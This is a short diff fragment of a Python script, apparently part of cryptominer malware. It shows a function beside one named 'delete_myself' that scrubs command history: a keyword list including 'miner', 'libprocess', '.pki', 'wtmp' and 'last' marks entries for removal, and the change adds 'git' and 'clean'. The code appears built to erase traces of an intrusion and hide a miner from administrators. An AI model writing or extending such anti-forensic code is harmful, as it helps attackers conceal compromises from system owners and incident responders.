@@ -86,7 +86,7 @@ def delete_myself():
     return
 
 def clean_cmdlog():
-    cmd_clean = ['miner', 'kill', '.nv', '.clean', 'libprocess', 'libselinux', 'h.c', 'a.c', '.bash', 'secure', '.pki', '.cc', 'exir', 'wtmp', 'last']
+    cmd_clean = ['miner', 'kill', '.nv', '.clean', 'libprocess', 'libselinux', 'h.c', 'a.c', '.bash', 'secure', '.pki', '.cc', 'exir', 'wtmp', 'last', 'git', 'clean']
     def match_sensitive(x):
         for i in cmd_clean:
             if x.find(i) >=0:
